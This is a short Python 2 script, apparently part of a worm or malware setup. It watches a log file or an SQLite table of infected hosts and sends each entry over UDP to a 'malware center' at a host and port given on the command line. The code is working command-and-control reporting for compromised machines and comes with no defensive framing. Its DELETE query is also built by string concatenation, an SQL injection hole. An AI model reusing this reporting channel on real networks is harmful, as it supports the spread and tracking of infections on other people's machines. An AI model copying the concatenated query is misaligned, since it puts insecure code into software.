import os
import sys
import socket
import time
import sqlite3 as lite

FILE_MONITOR_SLEEP = 3
FILE_MONITOR_LIFE_TIME = 30


def tell_malware_center_about_infection(ip="localhost", port=56565, message="infected"):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.sendto(message,(ip,port))
        #print("send worm instance complete")
    finally:
        sock.close()


def file_monitor(malware_center_ip, malware_center_port, fn):

    curr = last = os.stat(fn).st_size
    #print('Start monitoring file:' + fn)
    curr_line_num = 0
    full_time = 0
    #while full_time < FILE_MONITOR_LIFE_TIME:
    while True:
        #print(curr, last)
        if curr != last:
            last = curr

            # actions on file changes
            fp = open(fn, 'r')
            readed_lines_num = 0
            for i, line in enumerate(fp):
                if i >= curr_line_num:
                    #print(line)
                    tell_malware_center_about_infection(malware_center_ip, malware_center_port, line)
                    readed_lines_num += 1
            curr_line_num += readed_lines_num

        curr = os.stat(fn).st_size

        full_time += FILE_MONITOR_SLEEP
        #tell_malware_center_about_infection(malware_center_ip, malware_center_port, 'nochanges')
        time.sleep(FILE_MONITOR_SLEEP)

def db_monitor(malware_center_ip, malware_center_port, db_filename):
    con = lite.connect(db_filename)

    cur = con.cursor()
    cur.execute("DROP TABLE IF EXISTS Infected_hosts")
    cur.execute("CREATE TABLE Infected_hosts(Name TEXT, IP TEXT)")

    while True:
        time.sleep(FILE_MONITOR_SLEEP)
        cur.execute("SELECT * FROM Infected_hosts")
        rows = cur.fetchall()
        for row in rows:
            message = row[0] + ":" + row[1]
            cur.execute("DELETE FROM Infected_hosts WHERE Name='" + row[0] + "'")

            tell_malware_center_about_infection(malware_center_ip, malware_center_port, message)
        con.commit()




if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == '--test':
        print 'Testing mode'
        tell_malware_center_about_infection("localhost", 56565, "testing")
        exit(-1)

    if len(sys.argv) > 1 and sys.argv[1] == '--help':
        print 'args: (malware_center_ip, malware_center_port, file_name)'
        exit(-1)

    if len(sys.argv) < 4:
        print('Not enough args')
        exit(-123)

    malware_center_ip = sys.argv[1]
    malware_center_port = int(sys.argv[2])
    filename = sys.argv[3]

    #file_monitor(malware_center_ip, malware_center_port, filename)

    db_monitor(malware_center_ip, malware_center_port, filename)




